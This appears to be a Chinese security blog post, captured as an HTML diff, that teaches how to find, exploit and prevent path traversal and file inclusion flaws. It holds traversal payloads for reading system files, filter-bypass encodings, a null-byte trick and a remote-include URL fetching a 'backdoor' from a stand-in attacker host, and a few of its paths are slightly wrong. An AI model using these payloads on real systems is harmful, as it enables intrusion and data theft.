@@ -1,0 +1,1290 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="Zh_cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全,Web,注入,文件路径," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="操作文件路径如果应用程序使用用户可控制的数据、以危险的方式访问位于应用程序服务器或其他后端文件系统中的文件和目录，就会出现目录遍历漏洞。通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或者写入任意内容。这种漏洞往往使攻击者能够从服务器上读取敏感信息或者重写敏感文件，并最终在服务器上执行任何命令。 在下面的示例中，应用程序使用一个动态页面向客户端返回静态图像。被请求的图像名称在查询字符串">
+<meta property="og:type" content="article">
+<meta property="og:title" content="操作文件路径">
+<meta property="og:url" content="http://huhansi.com/2019/03/27/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-2-%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/index.html">
+<meta property="og:site_name" content="Hansi Blog">
+<meta property="og:description" content="操作文件路径如果应用程序使用用户可控制的数据、以危险的方式访问位于应用程序服务器或其他后端文件系统中的文件和目录，就会出现目录遍历漏洞。通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或者写入任意内容。这种漏洞往往使攻击者能够从服务器上读取敏感信息或者重写敏感文件，并最终在服务器上执行任何命令。 在下面的示例中，应用程序使用一个动态页面向客户端返回静态图像。被请求的图像名称在查询字符串">
+<meta property="og:locale" content="Zh_CN">
+<meta property="article:published_time" content="2019-03-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-08T13:25:26.330Z">
+<meta property="article:author" content="Han si">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="注入">
+<meta property="article:tag" content="文件路径">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://huhansi.com/2019/03/27/安全/Web安全/5-2-操作文件路径/"/>
+
+
+
+
+
+  <title>操作文件路径 | Hansi Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Zh_cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hansi Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Know something of everything, know everything of something</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://huhansi.com/2019/03/27/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-2-%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Han si">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hansi Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">操作文件路径</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-27T00:00:00+08:00">
+                2019-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h1><p>如果应用程序使用用户可控制的数据、以危险的方式访问位于应用程序服务器或其他后端文件系统中的文件和目录，就会出现目录遍历漏洞。通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或者写入任意内容。这种漏洞往往使攻击者能够从服务器上读取敏感信息或者重写敏感文件，并最终在服务器上执行任何命令。</p>
+<p>在下面的示例中，应用程序使用一个动态页面向客户端返回静态图像。被请求的图像名称在查询字符串参数中指定:</p>
+<p><strong><a href="http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg" target="_blank" rel="noopener">http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg</a></strong></p>
+<p>当服务器处理这个请求时，它执行以下操作。</p>
+<p>（1）从查询字符串中提取filename参数值</p>
+<p>（2）将这个值附加在C:\filestore\之后</p>
+<p>（3）用这个名称打开文件</p>
+<p>（4）读取文件的内容，并将其返回客户端</p>
+<p>漏洞之所以会发生，是因为攻击者可以将路径遍历序列放入文件名内，从第（2）步指定的图像目录向上回溯，从而访问服务器上的任何文件。众所周知，路径遍历序列表示为“点-点-斜线”（..\），一个典型攻击如下：</p>
+<p><strong><a href="http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows.win.ini" target="_blank" rel="noopener">http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows.win.ini</a></strong></p>
+<p>如果应用程序把filename参数的值附加到图像目录名称之后，就得到以下路径：</p>
+<p><strong>C:\filestore..\windows\win.ini</strong></p>
+<p>这两个遍历序列立即从图像目录回溯到C:驱动器根目录下，因此，前面的路径等同于以下路径：</p>
+<p><strong>C:\windows\win.ini</strong></p>
+<p>因此，服务器不会返回图像文件，而是返回默认的Windows配置文件。</p>
+<h2 id="查找和利用路径遍历漏洞"><a href="#查找和利用路径遍历漏洞" class="headerlink" title="查找和利用路径遍历漏洞"></a>查找和利用路径遍历漏洞</h2><h3 id="确定攻击目标"><a href="#确定攻击目标" class="headerlink" title="确定攻击目标"></a>确定攻击目标</h3><p>在对应用程序进行初步解析的过程中，应该已经去定了素有与路径遍历漏洞有关的明显受攻击面。主要用于文件上传或下载目的地所有功能都应进行全面测试。用户可共享文档的工作流程应用程序，允许用户上传的图像的博客与拍卖应用程序，以及为用户提供电子书。技术手册和公司表表等文档的信息型应用程序，常常使用这种功能。</p>
+<p>除这种明显的目标功能外，还有其他各种行为表示应用程序需要与文件系统进行交互。</p>
+<ol>
+<li>分析在应用程序解析过程中收集到的信息，确定以下内容。<ul>
+<li>请求参数中明显包含文件或目录名称的所有情形。例如，include=main.inc或template=/en/sidebar</li>
+<li>需要从服务器文件系统读取数据的所有应用程序功能。例如，显示办公文档或图像。</li>
+</ul>
+</li>
+<li>在测试其他漏洞的过程中，寻找有益的错误消息或其他反常事件。设法确定用户提交的数据被传送给文件API或作为操作系统命令参数的所有情况。</li>
+<li>如果能从本地访问应用程序，执行以下操作：<ul>
+<li>使用适当的工具监控服务器上的所有文件系统活动</li>
+<li>在每一个被提交的参数（包括全部cookie、查询字符串字段和POST数据项）中插入一个特殊的字符串测试应用程序的每一个页面。一次仅针对一个参数进行测试</li>
+<li>在文件系统监控工具中设置一个过滤器，确定所有包含测试字符串的文件系统事件</li>
+<li>如果发现测试字符串被用作文件或目录，或者出现在文件或目录名中，那么对于每一种情况进行测试，确定其是否收到路径遍历攻击。</li>
+</ul>
+</li>
+</ol>
+<h3 id="探查路径遍历漏洞"><a href="#探查路径遍历漏洞" class="headerlink" title="探查路径遍历漏洞"></a>探查路径遍历漏洞</h3><p>确定各种潜在的路径测试目标后，必须分别测试每种情况，弄清其是否以不安全的方式向相关文件操作系统传送用户可控制的数据。</p>
+<p>在测试用户提交的参数时，需确定遍历序列是否被应用程序阻止，或者他们能够正常工作。通常，提交不会向上回溯到其实目录的遍历序列是一种较为可靠的初步测试方法。</p>
+<ul>
+<li><p>假设所针对的参数被附加到应用程序预先设定的目标之后，那么插入任意一个子目录和一个遍历序列，修改参数的值。例如，应用程序提交参数</p>
+<p><strong>foo=foo/file1.txt</strong></p>
+<p>那么可以尝试提交以下值：</p>
+<p><strong>foo=foo/bar/../file1.txt</strong></p>
+<p>如果两种情况下应用程序的行为完全相同，就表示它易于受到攻击。应该继续测试，尝试通过向上回溯到起始目录来访问不同的文件。</p>
+</li>
+<li><p>在上述两种情况下，如果应用程序的行为有所不同，那么应用程序可能阻止、删除或净化遍历序列，致使文件路径失效。</p>
+<p>即使子目录“bar”并不存在，这个测试仍然有效，因为大多数文件系统在尝试获取文件路径前对其进行了规范化。路径序列删除了虚构的目录，因此服务器并不检查它是否存在。</p>
+</li>
+</ul>
+<p>如果的发现提交遍历序列但不向上回溯至起始目录不会影响应用程序的行为，那么就写来的测试中，应该尝试遍历出起始目录，从服务器文件系统的其他地方访问文件。</p>
+<ul>
+<li><p>如果所攻击的应用程序功能只拥有文件读取访问权限，那么尝试访问相关操作系统上的一个一致任何用户均可读取的文件。提交下面其中一个值作为受控制的文件名参数：</p>
+<p><strong>../../../../../../../../../../../../../etc/password</strong></p>
+<p><strong>../../../../../../../../../../../windows/win.ini</strong></p>
+</li>
+<li><p>如果所攻击的功能拥有文件写入访问权限，那么要最终确定应用程序是否易于受到攻击，可能会更困难。通常，一种有效的测试是尝试写入两个文件，一个文件可被任何用户写入，另一个文件即使是跟用户或管理员也禁止写入。例如，在windows平台上可以尝试写入下面两个文件：</p>
+<p><strong>../../../../../../../../../../../tmp/writest.txt</strong></p>
+<p><strong>../../../../../../../../../../../../tmp</strong></p>
+<p>在上面的每对测试中，如果应用程序在响应两个请求时表现出行为差异，那么应用程序可能易于受到攻击。</p>
+</li>
+<li><p>还有一种方法可通过写入访问确定遍历漏洞，即尝试在Web服务器的Web根目录中写入一个新文件，然后同时通过浏览器获得这个文件。但是，如果并不知道Web根目录的位置，或者访问文件的用户并不拥有写入权限，这种方法可能不会成功。</p>
+</li>
+</ul>
+<h3 id="避开路径攻击障碍"><a href="#避开路径攻击障碍" class="headerlink" title="避开路径攻击障碍"></a>避开路径攻击障碍</h3><p>最初的遍历尝试攻击并未成功，并不意味着应用程序不容易受到攻击。许多应用程序开发者意识到路径遍历漏洞，并执行各种输入确认检查尝试防止这种漏洞。但是，这些防御措施往往存在缺陷，可被技术熟练的攻击者轻易避开。</p>
+<p>第一种常见的输入过滤方法如下，首先检查文件名参数中是否存在任何路径遍历序列，如果存在，要么拒绝包含遍历序列的请求，要么尝试删除该序列，以对输入进行净化。这种类型过滤往往易于受到各种攻击，它们使用编码或其他方法来避开过滤。这类攻击全都利用输入确认机制所面临的规范化问题。</p>
+<ul>
+<li><p>尝试始终通过使用斜线与反斜线的路径遍历序列进行测试。许多输入过滤仅检查其中一种序列，而文件系统却支持全部两种序列。</p>
+</li>
+<li><p>尝试使用下面的编码方案，对遍历序列进行简单的URL编码。一定要多输入中的每一个斜线和点进行编码：</p>
+<ul>
+<li>点——%2e</li>
+<li>斜线——%2f</li>
+<li>反斜线——%5c</li>
+</ul>
+</li>
+<li><p>尝试使用下面的16位Unicode编码：</p>
+<ul>
+<li>点——%u002e</li>
+<li>斜线——%u2215</li>
+<li>反斜线——%u2216</li>
+</ul>
+</li>
+<li><p>尝试使用下面的双倍URL编码：</p>
+<ul>
+<li>点——%252e</li>
+<li>斜线——%252f</li>
+<li>反斜线——%255c</li>
+</ul>
+</li>
+<li><p>尝试使用下面的超长UTF-8 unicode编码：</p>
+<ul>
+<li>点——%c%2e、%e0%40%ae、%c0ae等</li>
+<li>斜线——%c0%af、%e0%80%af、%c0%2f等</li>
+<li>反斜线——%c0%5c、%c0%80%5c等</li>
+</ul>
+<p>可以在Burp Intruder中使用非法Unicode有效载荷类型为任何特殊字符生成大量其他形式的表示法，并将它提交到目标参数的相关位置。这些表示法严重违反了Unicode表示法规则，但却为许多Unicode解码器接受，特别是Windows平台上的解码器。</p>
+</li>
+<li><p>如果应用程序尝试通过删除遍历序列来净化用户输入，但没有以递归的方式应用这种过滤，那么可以用一个序列来替换另一个序列来避开过滤。例如：</p>
+<ul>
+<li><strong>….//</strong></li>
+<li><strong>…./\</strong></li>
+<li><strong>….\\</strong></li>
+</ul>
+</li>
+</ul>
+<p>第二种防御路径遍历攻击时常用的输入过滤，就是确认用户提交的输入是否包含应用程序想要的后缀或前缀。这种类型的防御可以与前面描述的过滤联合使用。</p>
+<ul>
+<li><p>一些应用程序检查用户提交的文件是否以一种或特殊的文件类型结尾，并决绝访问其他内容的请求，有时候，可以在请求的文件名后放入一个URL编码的空字节，在后面连接应用程序接受的文件类型，从而避开这种检查。例如：</p>
+<p><strong>../../../../../boot.ini%00.jpg</strong></p>
+<p>这种攻击有时会成功，是因为应用程序使用API在托管执行环境下执行文件类型检查，该执行环境允许字符串包含空字符。但是，当获取文件时，应用程序最终在一个无法控制的环境中使用API，因此文件名被截短为想要的值。</p>
+</li>
+<li><p>一些应用程序将它们自己的文件类型后缀附加在用户提交的文件名后，尝试控制被访问的文件类型。在这种情况下，基于相同的原因，前面的任何一种利用都可能取得成功。</p>
+</li>
+<li><p>一些应用程序检查用户提交的文件名的开头部分是否为起始目录的某一个子目录，或者一个特殊的文件名。当然，通过以下方法可轻易避开这种检查：</p>
+<p><strong>filestore/../../../../../../../etc/password</strong></p>
+</li>
+<li><p>如果以上针对输入过滤的攻击都无法成功，可能应用程序实施了几种类型的过滤，因此需要同时使用上面的几种攻击方法。遇到这种情况，如有可能，最好的方法是将问题分解成几个独立的阶段。例如，如果请求</p>
+<p>diagram1.jpg</p>
+<p>能够成功，但请求</p>
+<p>foo/../diagram1.jpg</p>
+<p>却导致失败，那么尝试使用所有可能的遍历序列，知道第二个请求获得成功。如果使用这些成功的遍历序列仍然无法访问/etc/password，就请求一下文件，检查应用程序是否实施任何文件类型过滤，以及是否可以避开这种过滤：</p>
+<p>diagram1.jpg%00.jpg</p>
+<p>彻底检查应用程序定义的起始目录，设法了解它实施的全部过滤，看是否可以利用上述技巧避开每一种过滤。</p>
+</li>
+<li><p>当然，如果能够随意访问应用程序，那么攻击就变得简单，因为渗透测试员可以系统性地攻击每种输入，并确定最终通过哪些文件名可以到达文件系统。</p>
+</li>
+</ul>
+<h3 id="处理定制编码"><a href="#处理定制编码" class="headerlink" title="处理定制编码"></a>处理定制编码</h3><p>应用程序采用的文件名编码方案最终以危险的方式进行处理，模糊处理也不能提供任何安全保障，这时就会出现最为可怕的路径遍历漏洞。</p>
+<p>例如，一些应用程序具有某种工作流程功能，允许用户上传下载文件，执行上传操作的请求提供一个文件名参数，它在写入文件时易于受到路径遍历攻击。如果一个文件成功上传，那么应用程序再为用户提供一个下载URL。这里有两点值得注意：</p>
+<ul>
+<li>应用程序核对将要写入的文件是否已经存在，如果存在，就拒绝重写这个文件。</li>
+<li>为下载用户文件而生成的URL使用一种定制模糊处理方案表示。这种方案似乎是一种定制的Base64编码形式，它在每个编码文件名位置使用一组不同的字符。</li>
+</ul>
+<p>总的来说，这些注意点给直接利用漏洞设置了障碍。首先，尽管能够给在服务器文件系统中写入任何文件，但攻击者无法重写任何现有文件，而且，Web服务器进程有用较低权限意味着攻击者不可能在任何有力位置创建新文件。其次，如果不对定制编码进行逆向工程，攻击者也不可能请求任意一个现有的文件。</p>
+<h3 id="利用遍历漏洞"><a href="#利用遍历漏洞" class="headerlink" title="利用遍历漏洞"></a>利用遍历漏洞</h3><p>可以利用读取访问路径遍历漏洞从包含有用信息的服务器上获取有益的文件，或者帮助优化针对其他漏洞的攻击，如下所示。</p>
+<ul>
+<li>操作系统与应用程序的密码文件</li>
+<li>服务器与应用程序配置文件，以发现其他漏洞或优化另一次攻击</li>
+<li>可能含有数据库帧数的包含文件</li>
+<li>应用程序使用的数据源，如MySQL数据库文件或XML文件</li>
+<li>服务器可执行页面的源代码，以执行代码审查，搜索漏洞</li>
+<li>可能包含用户名和会话令牌的应用程序日志文件等</li>
+</ul>
+<p>如果发现一个允许写入访问的路径遍历漏洞，那么渗透测试的主要目标应该是利用它在服务器上执行任意命令。利用漏洞实现这一目标的方法包括以下几种：</p>
+<ul>
+<li>在用户的启动文件夹中创建脚本</li>
+<li>当用户下一次连接时，修改in.ftpd等文件执行任意命令</li>
+</ul>
+<p>向一个拥有执行许可的Web目录写入脚本，从浏览器调用它们。</p>
+<h2 id="防止路径遍历漏洞"><a href="#防止路径遍历漏洞" class="headerlink" title="防止路径遍历漏洞"></a>防止路径遍历漏洞</h2><p>迄今为止，避免向任何文件系统API传送用户提交的数据时防止路径遍历漏洞的最有效方法。许多时候，包含在最初的GetIFile.aspx?filename=keira.jpg示例中，应用程序完全没有必要实施防御。因为大多数文件都没有采用访问控制，攻击者可以将这些文件存入Web根目录中，再通过URL直接访问。如果以上方法行不通，应用程序可能会保存一个可由页面处理的硬编码图像文件列表，并使用不同的标识符指定需要的文件。任何包含无效标识符的请求都可能遭到拒绝，因为没有受攻击面可供用户利用，使其操纵页面提供的文件路径。</p>
+<p>有时，与实现文件上传与下载的工作流程一样，应用程序可能需要允许用户通过名称指定文件，这时，开发者可能采用最简单的方法，将用户提交的用户名传送给文件系统API。从而达到这种目的。在这种情况下，应用程序应实施深层防御措施，为路径遍历攻击设立几层障碍。</p>
+<p>以下是一些可能有用的防御方法，在应用过程中，最好将它们组合在一起使用。</p>
+<ul>
+<li>对用户提交的文件名进行相关解码与规范化之后，应用程序应检查该文件名是否包含路径遍历序列（使用反斜线或斜线）或孔子杰。如果是这样，应用程序应停止处理请求，不得尝试对恶意文件名进行任何净化处理。</li>
+<li>应用程序应使用一个硬编码的。允许访问的文件类型列表，并决绝任何访问其他文件类型的请求（完成上述解码与规范化之后）。</li>
+<li>对用户提交的文件名进行一切必要的过滤后，应用程序应使用适当的文件系统API确认是否一切正常，以及使用该文件名访问的文件是否位于应用程序指定的起始目录中。</li>
+</ul>
+<p>应用程序可以使用一个chrooted环境访问包含被访问文件的目录，减轻大多数路径遍历漏洞造成的影响。在这种情况下，chrooted目录就好比是文件系统的根目录，任何视图从这个目录向上回溯的多余遍历请求都被忽略。大多数UNIX平台支持chrooted文件系统。在Windows平台上，以新逻辑驱动器形式安装相关起始目录，并且使用响应的驱动器字母访问目录内容，即可实现类似的效果。</p>
+<p>应用程序应将其路径遍历攻击防御机制与日志和警报机制整合在一起。任何时候，只要收到一个包含路径遍历序列的请求，提出请求的用户就可能心存恶意，应用程序应在日志中进行记录，表明该请求企图违反安全机制，并终止该用户的会话。如有可能，应冻结该用户账户并向管理员发出警报。</p>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>许多脚本语言支持使用包含文件（include file）。这种功能允许开发者把可重复使用的代码插入到单个的文件中，并在需要时将它们包含在特殊功能的代码文件中。然后，包含文件中的代码被解释，就好像它插入到包含指令的位置一样。</p>
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>PHP语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径。这种缺陷已经成为PHP应用程序中大量漏洞的根源。</p>
+<p>以一个想不通位置的人们传送各种内容的应用程序为例。用户选择他们的位置后，这个信息通过一个请求参数传送给服务器，代码如下：</p>
+<p><strong><a href="https://wahh-app.com/main.php?Country=US" target="_blank" rel="noopener">https://wahh-app.com/main.php?Country=US</a></strong></p>
+<p>应用程序通过以下方式处理Country参数：</p>
+<p><strong>$country = $_GET[‘Country’]</strong></p>
+<p><strong>include($country . ‘.php’)</strong></p>
+<p>这使执行环境加载位于Web服务器文件系统中的US.php文件。然后，这个文件的内容被复制到main.php中并得以执行。</p>
+<p>攻击者能够以各种方式利用这种行为，最严重的情况是指定一个外部URL作为包含文件的位置。PHP包含函数接受这个位置作为输入，接着，执行环境将获取指定的文件并制定其内容。因此，攻击者能够构建一个包含任意复杂内容的恶意脚本，将其及存在他控制的Web服务器上，并通过易受攻击的应用程序函数调用它然后执行。例如：</p>
+<p><strong><a href="https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor" target="_blank" rel="noopener">https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor</a></strong></p>
+<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>有时，应用程序根据用户可控制的数据加载包含文件，但这是不可能给位于外部服务器上的文件制定URL。例如，用户可控制的数据被提交给ASP函数Server.execute，那么攻击者就可以执行任意一段ASP脚本，只要这段脚本属于调用这个函数的相同应用程序。</p>
+<p>在这种情况下，攻击者仍然可以利用应用程序的行为执行未授权的操作。</p>
+<ul>
+<li>在服务器上可能有一些通过正常途径无法访问的路径，例如，任何访问路径/admin的请求都会被应用程序实施的访问控制阻止。如果能够将敏感功能包含在一个授权访问的页面中，那么就可以访问那个功能。</li>
+<li>服务器上的一些静态资源也受到同样的保护，无法直接访问。如果能够将这些文件攻台包含在其他应用程序页面中，那么执行环境就会将静态资源的内容复制到它的响应中。</li>
+</ul>
+<h2 id="查找文件包含漏洞"><a href="#查找文件包含漏洞" class="headerlink" title="查找文件包含漏洞"></a>查找文件包含漏洞</h2><p>任何用户提交的数据项都可能因此文件包含漏洞。它们经常出现在指定一种语言或一个位置的请求参数中，也常常发生在以参数形式传送服务器端文件名的情况下。</p>
+<p>要测试远程文件包含漏洞，执行以下步骤：</p>
+<ol>
+<li>向每一个目标参数提交一个连接受控制的Web服务器资源的URL，并确定是否收到运行目标应用程序的服务器提出任何请求。</li>
+<li>如果第一次测试失败，尝试提交一个包含不存在的IP地址的URL，并确定服务器视图与这个地址建立连接时是否出现超时。</li>
+<li>如果发现应用程序易于受到远程文件包含攻击，与前面描述的动态执行攻击中一样，使用相关语言中的可用API，弓箭一段恶意脚本实施攻击。</li>
+</ol>
+<p>相对于远程文件包含而言，存在本地文件包含漏洞的脚本环境要多一些。要测试本地文件包含漏洞，执行以下步骤：</p>
+<ol>
+<li>提交服务器上一个已知可执行资源的名称，确定应用程序的行为是否有任何变化</li>
+<li>提交服务器上一个已知静态资源的名称，确定它的内容是否被复制到应用程序的响应中。</li>
+<li>如果应用程序易于受到本地文件包含攻击，尝试通过Web服务器访问任何无法直接到达的敏感功能或资源</li>
+<li>测试能够利用之前讲到的遍历技巧访问其他目录中的文件。</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag"># 注入</a>
+          
+            <a href="/tags/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/" rel="tag"># 文件路径</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/26/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-1-%E6%B3%A8%E5%85%A5OS%E5%91%BD%E4%BB%A4/" rel="next" title="注入操作系统命令">
+                <i class="fa fa-chevron-left"></i> 注入操作系统命令
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/29/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-3-%E6%B3%A8%E5%85%A5XML%E8%A7%A3%E9%87%8A%E5%99%A8/" rel="prev" title="注入XML解释器">
+                注入XML解释器 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Han si</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
